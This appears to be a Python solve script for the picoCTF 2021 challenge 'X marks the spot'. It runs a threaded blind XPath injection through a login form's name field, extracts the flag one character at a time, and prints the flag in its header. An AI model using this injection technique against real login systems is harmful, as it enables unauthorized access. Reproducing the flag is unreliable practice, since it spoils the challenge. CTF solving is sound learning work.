# 185 - X marks the spot  (Web Exploitation, picoCTF 2021)
# Flag: academy{h0p3fully_u_t0ok_th3_r1ght_xp4th_b61f3d39}
# Write-up: ../../../writeups/web-exploitation/185-x-marks-the-spot.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, re, json, time, requests, urllib3, string, threading, queue
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab
urllib3.disable_warnings()

cy = CyLab(delay=0.6)
cy.login()
cy.req("PUT", "/api/challenges/185/instance/?source=library")
base = None
for _ in range(12):
    st, b = cy.req("GET", "/api/challenges/185/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"(http://[A-Za-z0-9.\-]+:\d+/)", d.get("description") or "")
    if m:
        base = m.group(1)
        break
    time.sleep(0.5)
print("base:", base)
if not base:
    sys.exit(1)
SENT = "right path"
LOG = open(r"./_z_185log2.txt", "w", encoding="utf-8", buffering=1)


def log(*a):
    m = " ".join(str(x) for x in a)
    LOG.write(m + "\n")
    print(m, flush=True)


local = threading.local()


def check(prefix):
    if not hasattr(local, "s"):
        local.s = requests.Session()
    inj = "' or //*[contains(.,\"%s\")] or 'x'='" % prefix
    for _ in range(3):
        try:
            r = local.s.post(base, data={"name": inj, "pass": "asdf"}, timeout=15)
            return SENT in r.text
        except Exception:
            time.sleep(0.5)
    return None


print("test academy:", check("academy"))
options = list(string.ascii_lowercase) + list(string.digits) + ["_", "}", "-", "!"] + list(string.ascii_uppercase)
flag = None
for start in ("academy{", "academy", ""):
    if check(start) is True:
        flag = start
        log("depart:", repr(flag))
        break
if flag is None:
    log("pas de depart")
    sys.exit(1)
while not flag.endswith("}") and len(flag) < 80:
    cur = flag
    q = queue.Queue()
    for ch in options:
        q.put(ch)
    found = []
    lock = threading.Lock()
    stop = threading.Event()

    def worker():
        while not stop.is_set():
            try:
                ch = q.get_nowait()
            except queue.Empty:
                return
            r = check(cur + ch)
            if r is True:
                with lock:
                    if not found:
                        found.append(ch)
                stop.set()
                return

    ts = [threading.Thread(target=worker) for _ in range(4)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    if not found:
        log("bloque apres %r" % flag)
        break
    flag += found[0]
    log("  %r" % flag)
log("FLAG: %s" % flag)
